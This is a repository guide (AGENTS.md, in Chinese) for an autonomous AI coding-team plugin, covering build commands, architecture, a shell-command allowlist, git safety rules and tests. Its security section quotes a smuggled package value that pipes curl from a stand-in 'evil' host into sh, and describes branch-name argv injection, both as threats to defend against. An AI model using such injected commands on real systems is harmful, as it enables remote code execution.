# AGENTS.md

面向 AI 编码代理的仓库指南。dsh-ai-team 是 DeepSeek Harness（dsh）的插件：喂给它一台裸机、一组以环境变量引用的密钥和一个 git 远端，插件驱动的 AI 团队（leader / developer / reviewer / operator）自主跑完「引导 → 拆任务 → 并行开发 → 质量门 → 审查 → 合并 → 部署 → 迭代」，人只在升级（escalation）时介入。

> 本文件是 human-only 区（默认 `security.forbiddenPaths` 含 `AGENTS.md`），插件自身的 AI 团队不会修改它，只由人维护。

## 命令速查

| 目的 | 命令 |
| --- | --- |
| 安装依赖 | `pnpm install` |
| 类型检查 | `pnpm typecheck`（`tsc` 两份配置 `--noEmit`，strict，必须 0 error） |
| 静态检查 | `pnpm lint`（oxlint，必须 0 warning） |
| 测试 | `pnpm test`（vitest，真实 git 仓库） |
| 构建 | `pnpm build`（`tsc` × 2 → `tsdown` → `lib/{index.js,client.js}`） |
| 本地跑插件 | `pnpm dsh web --patch ./cordis.patch.yml` |
| 发布前校验 | `pnpm pack --dry-run`（`prepublishOnly` 已串起 typecheck+lint+test+build） |

环境：Node `>=22.19`、pnpm 11.x。单测跑单个文件用 `pnpm exec vitest run tests/test-unattended.ts`。

## 目录地图

```
src/
  index.ts        插件入口：四导出 name/inject/Config/apply，ctx.provide('autopilot')
  service.ts      AutopilotService —— 状态机宿主与全部编排（纯逻辑请落到 service/，别塞这里）
  exec.ts         共享 shell runner：gates / bootstrap / deploy 的 runShell 唯一实现
  service/
    options.ts    AutopilotOptions：Config 校验映射之后的运行时形状
    state.ts      内部记录（= state.json 的形状）+ shortId/clip/noteLines 等共享纯函数
    description.ts 任务描述组装：注入顺序与「所有权 > 教训 > 正文」的预算倒排
    report.ts     完成报告渲染（落在 <stateDir>/completion.md）
  tools.ts        模型可见工具（defineTool 注册），每次变更 publish 一次快照
  vocab.ts        运行时枚举词表（ROLES / TASK_STATUSES / ESCALATION_REASONS …）：零依赖、浏览器安全
  schema.ts       zod 形状真相 + `z.infer` 派生视图类型：视图与投影校验的唯一来源，只依赖 zod 与 vocab
  view.ts         类型门面：`export * from './vocab.js'` + 纯类型 re-export（禁 node、禁值引用 schema）
  events.ts       session 事件与投影的类型声明合并（唯一词汇表）
  projection.ts   `autopilot` 投影单元的注册（schema 已移到 schema.ts；stateVersion: 4）
  git.ts          git CLI 薄封装：远端 clone/push、push 安全规则、ref 名校验（assertSafeRef）
  team.ts         .tasks/*.md 契约解析 / 回写 / _board.md 生成、touches 重叠判断
  gates.ts        质量门执行器 + 命令白名单（CommandNotAllowedError）
  bootstrap.ts    裸机引导：探测工具链 → rootless 安装 → setup → verify
  deploy.ts       部署 + 健康检查（指数退避）+ 自动回滚
  escalate.ts     升级记录：打标、写任务单留言、发 webhook
  notification.ts Mailer（自研 SMTP，仅用 node:net/tls）+ TicketServer（本地问卷工单）
  secrets.ts      密钥唯一出口：env 引用解析 + SecretRedactor 脱敏
  learnings.ts    知识回路纯逻辑：捕获去重 / 有界注入 / learnings.md 渲染（落 stateDir，真相源在 state.json）
  roles.ts        四角色的 system prompt 模板
  preset.ts       `autopilot-team` agent 预设的落盘（ensureAutopilotTeamPreset，缺失才拷贝、绝不覆盖、失败静默）
  profile.ts      项目画像适配器：按不同协作约定（AgentDeploy 等）覆盖默认分支/PR 策略/合并方式/质量门
  cache.ts        构建缓存共享：把 .nuxt/.output 等产物按分支符号链接复用（可选、尽力而为）
  github.ts       GitHub REST 适配层：为任务分支 upsert PR、查询 commit 的 CI 状态
  client/         Web 端：面板、设置卡片、i18n 字典、样式、宿主契约（React 18，CJS 产物）
preset/
  autopilot-team/ 插件自带的 agent preset 模板（agent.cordis.yml + preset.yml），随包发布，运行时拷到用户级预设根
tests/            helpers.ts（真 git fixture）+ integration / unattended / notification / profile / bootstrap / cache / learnings 七个测试文件 + smoke-cordis 冒烟（含预设落盘断言）
```

## 运行时拓扑

```
<rootDir>/<teamId>/repo                共享仓库（集成检出，始终在 baseBranch）
<rootDir>/<teamId>/workspaces/<memberId>  每个成员一个 git worktree，共享 object store
<stateDir>/state.json                  全量状态（防抖落盘，dispose 时 flush）
<stateDir>/heartbeat.json              每 tick 写入，供崩溃恢复
<stateDir>/learnings.md                台账便利视图（运行态，不入库）
<stateDir>/completion.md               完成报告（运行态，不入库）
<stateDir>/state.json.corrupt-<ts>     解析失败时改名留存，不让空状态覆盖掉唯一一份历史
<repo>/.tasks/<id>.md                  任务真相源（frontmatter + Gherkin 验收）
<repo>/.tasks/_board.md                自动生成，勿手改；内容稳定（不含时间戳，否则每拍都弄脏 worktree）
```

`.dsh-ai-team/` 与 `**/state.json`、`**/heartbeat.json` 已在 `.gitignore` 中，运行态绝不入库。

## 架构铁律

1. **核心与 cordis 解耦**：`AutopilotService` 不 import `ctx`/session，可独立实例化跑测试。插件层只做四件事——命名导出、提供服务、注册工具、`ctx.effect` 清理。
2. **只用命名导出**：`index.ts` 不能加 `export default`，否则 Loader 的默认解包会丢掉 `Config` schema。
3. **投影是全量快照 + last-write-wins**：每个 `autopilot/update` 事件携带完整的 `AutopilotProjection`，折叠函数直接替换，不做增量合并。
4. **状态与事件分离**：service 负责状态，tools.ts 负责把变更翻译成 session 事件。不要反向依赖。
5. **`view.ts` 是浏览器安全的**：客户端产物会内联它。两个方向都要守 ——
   - 不得 import node 内置模块（会炸客户端构建）；
   - 对 `schema.ts` 只能 `export type { ... } from`。写成**值**导入不会有任何编译错误，但整个 zod 会被静默打进前端产物。
   `tests/smoke-cordis.ts` 的「keeps the client bundle browser-safe」直接断言 `lib/client.js` 里没有 zod / `node:` require，并正面断言词表确实在产物里 —— 所以这条不是纸面规则（改动 view.ts 后记得先 `pnpm build` 再跑它）。

## 安全硬规则（不可绕过）

1. **密钥只引用不落盘**：Config 只存环境变量名（`xxxEnv`），运行时 `process.env[name]` 读取。任何面向模型/日志/webhook 的输出必须过 `SecretRedactor`（脱敏为 `***`）。
2. **命令白名单**：gates / bootstrap / deploy 的每个 shell 片段首 token 必须命中 `security.commandAllowlist`，否则抛 `CommandNotAllowedError` 并引导走升级。判据是**「凡能悄悄启动一个白名单没见过的进程的构造，要么独立成段受检、要么整条拒绝」**：
   - 分隔符拆全 —— `&& || ; | &` 与**换行**（`splitSegments`）；
   - 命令替换 `$( )` 与反引号**整条拒绝**（`hasHiddenExecutable`），不做拆分放行的假象；
   - 重定向与 glob（`>`、`*`）**继续放行**：它们由同一个 shell 处理、不启动新进程，拦下来只打断正常配置而无安全收益。
   - `bootstrap.systemPackages` 会被拼进 `packageManagerCommand` 之后交给 shell，所以**每个包名都要过 `PACKAGE_NAME_RE`** —— 少了这步，`['python3; curl evil|sh']` 就让 pm 的白名单校验形同虚设（实测确认过它真的会执行）。
   - ⚠️ 仍然成立的事实：清单里有 `sh` / `node` / `ssh` / `docker` 时，白名单就等价于没开（`node -e` 即任意执行）。这道定位是**防人误配 + 留审计痕迹**，不是防一个已被注入的模型。
3. **forbiddenPaths**：任何改动落地前都要查分支相对基线的 diff，三条路径共用 `assertNoForbiddenChanges`：`pr_sync`（比 `origin/base`）、reviewer approve（比本地 base）、`team_branch` 的 merge（比 target）。触及 human-only 区直接拒绝并升级；**基线或源 ref 解析不出来时拒绝并升级，绝不静默放行**。
4. **门不过不合并**：`pushRequiresGates` 时门红禁 push/approve；`requireCiGreen` 是**另一道独立的门**（不再被 `pushRequiresGates` 短路），且 `ciStatus === null`（从未 `pr_sync`）视为未验证 → 禁 approve。注意：CI 状态只有 github 平台查得到，其它平台 `pr_sync` 恒置 `unknown`、该门自动不强制 —— 非 github 仓库请显式关掉 `requireCiGreen`，别以为它在保护你。
5. **禁止破坏性 git**：不 force-push 共享分支（任务/成员分支仅限 `--force-with-lease`）、不 reset 共享分支、不删 base 分支。所有可变 git 操作（create / checkout / merge / delete / push）的分支名一律过 `assertSafeRef`：不得以 `-` 开头、不得含空格或 `..`，否则模型传一个 `-D` 就能把 `git branch -D <同事的任务分支>` 拼进 argv 静默删分支。

## 代码风格

- TypeScript strict + `noUncheckedIndexedAccess` + `verbatimModuleSyntax`：类型导入必须写 `import type`，相对导入必须带 `.js` 扩展名。
- 标识符用英文；**源码注释尽量用中文**（读懂代码比省几个字符更重要）；用户可见文案走 client 的 zh/en 字典。
- 加 i18n key 时 **zh 与 en 必须同时加**（`en: Record<keyof typeof zh, string>` 会强制你补齐）。
- 提交信息用 Conventional Commits（`feat:` / `fix:` / `docs:` / `refactor:`，正文中文，见 `git log`）。
- 宣告完成前按 `pnpm typecheck && pnpm lint && pnpm build && pnpm test` 的顺序跑（build 必须在 test 前，原因见「测试约定」）。

## 状态机

- 任务：`pending → in_progress → in_review → done`，`changes_requested` 打回，升级置 `needs-human`（人工处理后可回 `pending`）。
- 循环：`stopped / running / paused / escalated / completed`。崩溃恢复时持久化的 `running` 一律降为 `paused`，等 `autopilot_resume`。
- 升级触发条件（命中即 escalate，禁止自行绕过）：需求矛盾 / 跨 3+ 域改动 / 需新增付费依赖或密钥 / 非本任务导致的门红 / 触及 forbiddenPaths / 返工超限 / 任务卡死 / 超出任务墙钟预算（`daemon.maxTaskHours`）/ 部署连续失败 / 引导失败。

## 改一处要连带改哪儿

| 你改了 | 必须同步 |
| --- | --- |
| 视图**形状**（字段增删） | 只改 `schema.ts` —— 视图类型由 `z.infer` 派生，不必手写第二份；连带：`stateVersion` +1、`client/AutopilotPanel.tsx` 渲染、需要文案则加字典 |
| 枚举**取值**（状态、原因、kind…） | 只改 `vocab.ts` 的那个 `as const` 数组 —— zod enum、`tools.ts` 参数、面板渲染都读它；面向人的加字典 |
| 新增 tool | `tools.ts` 内 `publish(service, exec)`；README「工具一览」 |
| 新增 role | `vocab.ts` 的 `ROLES` → `roles.ts` prompt → 字典 `role.*` |
| 新增 `EscalationReason` | `vocab.ts` 的 `ESCALATION_REASONS` → 字典 `reason.*`；⚠️ 先确认服务端真会产出它，无人产出的分类只会给模型多一个错选项 |
| 新增 Config 字段 | `index.ts` 的 `Config` 接口与 schema → `service/options.ts` 的 `AutopilotOptions` → `apply()` 的映射 → README 配置块 → 需要时 `client/settings-card.tsx` |
| 改 `profile.ts` 的约定 | 服务端默认值可能与 `ProjectProfile` 分叉，改前先核对 `README` 的 AgentDeploy 说明 |
| 新增远端平台/PR 能力 | `github.ts` 适配层是否覆盖该平台 → `vocab.ts` 的 `CI_STATUSES`；⚠️ `remote.platform` 的 `'github' \| 'cnb' \| 'gitlab' \| 'generic'` 目前仍手抄在 `index.ts`（唯一残留的双写枚举，且非 github 无 CI 查询实现） |

## 已知坑

1. **本地起 dsh 会引导失败**：`cordis.patch.yml` 默认 `bootstrap.setupCommand: pnpm run setup`、`verifyCommand: pnpm run e2e:local`，但本仓库 scripts 里没有这两个。本地调试时把 `bootstrap.enabled` 设为 `false`，或指向真实存在的脚本，否则 `autopilot_init` 会 escalate + throw。
2. **tsdown 的 `clean: false` 是故意的**：`lib/types`（tsc 产物）与 `lib`（打包产物）同目录，打开 clean 会把 d.ts 一起抹掉。
3. **client 产物的 banner/footer 不能动**：`tsdown.config.ts` 用 `window.__ModuleLoader__.load(...)` 包裹 CJS 输出，改了 Loader 就加载不了插件。
4. **测试用真实 git，不 mock**：`tests/helpers.ts` 用本地 bare 仓库扮演 remote。vitest 配了 `fileParallelism: false` + `pool: 'forks'`，别图快改成并行，会互相踩 worktree。
5. **`smoke-cordis` 测的是构建产物**：它 import `../lib/index.js`，改完源码必须先 `pnpm build` 再跑，否则测的是旧产物。
6. **设置卡片改动需重启**：`autopilot` 命名空间在插件加载时注册，设置页改配置要带 `--patch` 重启服务端才生效。
7. **`autopilot-team` 预设是随包分发 + 运行时落盘的**：模板在 `preset/autopilot-team/`，`ensureAutopilotTeamPreset()` 在 `apply()` 时拷到用户预设根（缺失才拷、绝不覆盖）。预设目录盘点无缓存，落盘后刷新即见；但**自动建 `demo` 团队**的钩子在宿主 `lib/index.js`，改宿主代码后需重启服务端。

## 测试约定

- `tests/test-integration.ts` 全流程生命周期（clone → 派发 → 门 → 审查 → 合并 → push → 部署）。
- `tests/test-unattended.ts` 循环分支（崩溃恢复、依赖/域锁、卡死、返工上限、完成报告）+ 安全硬规则。
- `tests/test-notification.ts` 真 mock SMTP（net）+ 真工单端口，验证通知闭环。
- `tests/test-profile.ts` / `test-bootstrap.ts` / `test-cache.ts` / `test-learnings.ts` 各适配层与纯逻辑模块。
- `tests/test-exec.ts` **shell runner 的行为锁定**：超时折算成 exitCode 1、只有 abort 才 reject、`CI=true`、日志尾保留最后 4000 字符。改 `exec.ts` 时这组必须一条不改地通过，才是「纯搬家没改行为」。
- `tests/test-allowlist.ts` **白名单判定语义**：命令替换 / 反引号 / 换行 / 裸 `&` 一律不给静默放行（含一条"标记文件没被创建"的证据断言，证明确实没 spawn），而重定向与 glob 仍放行 —— 判据见「安全硬规则 2」。
- `tests/test-service-modules.ts` `service/` 下纯函数的直接单测（描述预算倒排、完成报告渲染、state 工具）。
- `tests/smoke-cordis.ts` Loader 契约冒烟。
- 新增断言优先用 `AutopilotOptions` 工厂 `testOptions(fixture, overrides)`，别手搓配置对象。
- ⚠️ 校验顺序必须是 `typecheck && lint && build && test`：`smoke-cordis` 跑的是 `lib/` 产物，把 build 放在 test 之后会拿上一版 lib 测出**假失败**（本轮实测踩过）。

## 发布

`npm publish` 前 `prepublishOnly` 会自动跑 typecheck + lint + **build** + test（顺序要求见「测试约定」），全绿才发包。`files` 含 `lib/`、`preset/`、`README.md`、`LICENSE`、`cordis.patch.yml`。改版本号后先 `pnpm pack --dry-run` 核对清单。
